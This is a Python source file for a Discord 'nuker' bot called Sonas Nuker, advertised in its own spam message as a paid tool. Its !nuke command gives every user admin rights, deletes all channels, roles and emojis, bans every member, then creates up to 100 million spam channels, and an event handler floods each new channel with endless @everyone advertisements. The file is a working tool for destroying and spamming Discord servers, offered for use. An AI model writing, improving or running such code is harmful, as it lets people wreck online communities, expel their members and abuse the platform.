import discord
from discord.ext import commands
import random
import fade
from discord import Permissions
from colorama import Fore, Style
import asyncio
import os
import time as T
import subprocess

expected_password = "1646613698SonasOnTop"

def get_password():
    """Prompt the user for the password."""
    password = input("Enter the password to start the bot: ")
    return password.strip()

def validate_password(password):
    """Validate the entered password."""
    return password == expected_password

password = get_password()

if not validate_password(password):
    print("Wrong password, try again...")
    get_password()

with open('token.txt', 'r') as file:
    TOKEN = file.readline().strip()

SPAM_CHANNEL = ["Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!", 
                "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!",
                "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!","Sonas Nuker on Top!",
                "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!", "Sonas Nuker on Top!"]
SPAM_MESSAGE = [
    "@everyone **Nuked by: Sonas Nuker, a Paid Nuker for $20.00** ****!!GET IT TODAY!!****"]

bot = commands.Bot(command_prefix="!")



bot.remove_command("help")
bot.remove_command("socials")
bot.remove_command("nuke")
bot.remove_command("logBot")




@bot.event
async def on_ready():
    print(fade.fire(''' 
  ██████  ▒█████   ███▄    █  ▄▄▄        ██████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ ▒████▄    ▒██    ▒     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒▒██  ▀█▄  ░ ▓██▄      ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒░██▄▄▄▄██   ▒   ██▒   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒░ ████▓▒░▒██░   ▓██░ ▓█   ▓██▒▒██████▒▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░ ░ ░ ▒     ░   ░ ░   ░   ▒   ░  ░  ░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
      ░      ░ ░           ░       ░  ░      ░              ░    ░     ░  ░      ░  ░   ░     
                                                                                           

                        ╔═════════════════════════╗         ╔═════════════════════════╗
                        ║       Sonas Nuker       ║         ║        Sonas Nuker      ║
                     ╔═══════════════════════════════╗   ╔═══════════════════════════════╗
                     ║ [1] !help                     ║   ║   [4] !scocials               ║  
                     ║ [2] !nuke                     ║   ║                               ║
                     ║ [3] !logBot                   ║   ║                               ║
                     ║                               ║   ║                               ║
                     ║                               ║   ║                               ║
                     ║                               ║   ║                               ║
                     ║                               ║   ║                               ║
                     ║                               ║   ║                               ║
                     ║                               ║   ║                               ║
                     ╚═══════════════════════════════╝   ╚═══════════════════════════════╝     

 '''))
    await bot.change_presence(activity=discord.Game(name="Best Discord Utility bot out there"))




# Bot Commands -->



@bot.command()
@commands.is_owner()
async def logBot(ctx):
    embed = discord.Embed(title="Bot Shutdown", description="""

Sonas has been Disabled successfully, Rerun the program to Use the bot again!

""")
    await ctx.bot.logout()
    T.sleep(5)
    print(Fore.MAGENTA + f"{bot.user.name} has logged out successfully." + Fore.RESET)

@bot.command()
async def help(ctx):
  embed = discord.Embed(title="Command Used: !Help", description="""

!nuke - Nukes the server
!help - Displays all the commands
!bot_stop - Logs the bot out
!socials - Displays the Devs discord and the official discord server!

""", color=0xd4af37, ephemeral=True)
  await ctx.send(embed=embed)


@bot.command()
async def socials(ctx):
    embed = discord.Embed(title="Socials -->", description="""

Join the Sonas Nuker Official Discord server today
Link [ https://discord.gg/ptMJcRTx9z ]

""", color=0xd4af37)
    await ctx.send(embed=embed)


@bot.command()
async def clear(ctx, amount=100):  # Default to deleting 100 messages
  if amount > 100:
    await ctx.send("Sorry, I can only delete a maximum of 100 messages at once.")
    return
  try:
    deleted = await ctx.channel.purge(limit=amount)
    await ctx.send(f"Successfully deleted {len(deleted)} messages.", ephemeral=True)
  except discord.Forbidden:
    await ctx.send("I don't have permission to delete messages in this channel.")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
        print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
        try:
            await member.ban()
            print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban("𝐘𝐨𝐮𝐫_𝐔𝐬𝐞𝐫")
            print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("Sonas On Top Baby!")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 100000000
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return


@bot.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))



bot.run(TOKEN)